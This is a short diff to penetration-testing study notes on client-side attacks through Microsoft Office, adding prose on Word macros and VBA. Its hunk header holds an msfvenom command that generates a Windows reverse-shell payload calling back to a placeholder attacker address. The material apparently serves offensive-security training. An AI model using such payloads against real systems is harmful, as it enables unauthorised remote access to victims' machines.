@@ -80,6 +80,9 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc po
 ### Exploiting Microsoft Office
 When leveraging client-side vulnerabilities, it is important to use applications that are trusted by the victim in their everyday line of work. Unlike potentially suspicious-looking web links, Microsoft Office1 client-side attacks are often successful because it is difficult to differentiate malicious content from benign. In this section, we will explore various client-side attack vectors that leverage Microsoft Office applications
 #### Microsoft Word Macro
+The Microsoft Word macro may be one the oldest and best-known client-side software attack vectors.
+
+Microsoft Office applications like Word and Excel allow users to embed macros, a series of commands and instructions that are grouped together to accomplish a task programmatically. Organizations often use macros to manage dynamic content and link documents with external content. More interestingly, macros can be written from scratch in Visual Basic for Applications (VBA), which is a fully functional scripting language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications.
 #### Object Linking and Embedding
 Another popular client-side attack against Microsoft Office abuses Dynamic Data Exchange (DDE)1 to execute arbitrary applications from within Office documents, but this has been patched since December of 2017. In this attack scenario, we are going to embed a Windows batch file5 inside a Microsoft Word document.
 ### Hashing & Cracking
